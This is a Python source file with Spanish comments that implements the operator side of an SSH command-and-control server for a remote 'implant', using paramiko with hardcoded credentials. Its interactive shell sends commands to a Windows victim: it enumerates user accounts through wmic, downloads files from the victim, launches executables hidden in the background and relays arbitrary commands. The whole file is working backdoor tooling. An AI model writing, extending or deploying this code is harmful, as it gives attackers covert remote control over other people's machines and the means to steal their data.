import paramiko
import os
import socket
class SSHServer (paramiko.ServerInterface):
    def check_channel_request(self, kind, chanid):
        #metodo de conexion basico
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        #conexion fallida por defecto
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    #aqui se puede meter encriptacion etc etc pero mejor hacerlo simple
    def check_auth_password(self, username, password):
        #aqui el usuario y pass que usaremos para el implant
        if (username == "sshuser") and (password == "sshpass"):
            #login correcto
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED        
def main():
    server = "0.0.0.0" #para escuchar por cualquier interfaz
    port = 2222
    #llaves ssh (generar una en ubuntu con sshkeygen)
    cwd = os.getcwd()
    #con esto añado el directorio en el que estoy + la clave id_rsa
    hostkey = paramiko.RSAKey(filename=os.path.join(cwd, "id_rsa"))
    #sockets
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #usamos el reuseaddr para usar el mismo puerto para varias cosas
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, port))
        sock.listen()
        print("Buscando conexiones:")
        client, addr = sock.accept()

    except KeyboardInterrupt:
        quit()
    ssh_session = paramiko.Transport(client)
    ssh_session.add_server_key(hostkey)
    server = SSHServer()
    ssh_session.start_server(server=server)
    chan = ssh_session.accept()
    if chan is None:
        print("Error de transporte o sesion")
        quit()
    print(chan) #para ver si que error saca
    success_msg = chan.recv(1024).decode()
    print(f"{success_msg}")
    chan.send(" ")
    def comm_handler():
        try:
            while True:
                cmd_line = ("Shell%> ")
                command = input(cmd_line + "")
                #args = command.split()
                if command == "get_users":
                    command = ("wmic useraccount list brief")
                    chan.send(command)
                    #respuesta
                    ret_value = chan.recv(8192)
                    print(ret_value.decode())
                    continue
                if command == "get_file":
                    chan.send(command)
                    filetodown = open("texto.txt", "wb")
                    ret_value = chan.recv(8192)
                    filetodown.write(ret_value)
                    filetodown.close()
                    print(ret_value.decode())
                if command.split(" ")[0] == "exec":
                    ejecutable = command.split(" ")[1]
                    ejecucion = "start /MIN /B " + ejecutable
                    chan.send(ejecucion)
                    ret_value = chan.recv(8192)
                    print(ret_value.decode())
                if command == "":
                    continue            
                else:
                        chan.send(command)
                        ret_value = chan.recv(8192)
                        print(ret_value.decode())
                        continue
        except Exception as e:
            print(str(e))
            pass
        except KeyboardInterrupt:
            quit()
    comm_handler()
if __name__ == "__main__":
    main()

